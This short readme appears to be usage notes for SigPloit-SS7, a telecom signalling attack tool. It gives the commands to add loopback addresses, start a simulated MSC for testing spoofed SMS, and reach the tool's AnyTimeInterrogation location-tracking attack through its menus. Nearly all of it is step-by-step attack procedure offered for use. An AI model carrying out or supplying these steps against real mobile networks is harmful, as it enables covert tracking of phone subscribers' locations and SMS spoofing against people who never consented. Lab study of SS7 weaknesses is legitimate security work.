# All variable are hardcoded, they could be changed upon your need and found in server tests source codes

# This code simulates the MSC which is responsible to switch/deliever the traffic to the specificed user. With this simulation 
you will make sure that your spoofed sms is readable in the correct format you need and its working. Below are few hardcoded parameters 
that are used in this simulation

# Run the java file to initiate the SCTP stack.

# You need to add the ip address to the terminal machine to launnch the attack

sudo ip address add 192.168.56.101/32 dev lo
sudo ip address add 192.168.56.102/32 dev lo

sudo java -jar MTForwardSMSResp.jar

# after initiating the stcp stack go back to the SigPloit-SS7 so that we can run SS7 python file.

python2 ss7

# For performing the attack we need to follow step -> SS7 -> Location Tracking -> AnytimeInterrogation
sig> 0  
(Attacks)> 2
(LocationTracking)> 1

# then you write the hardcoded values.
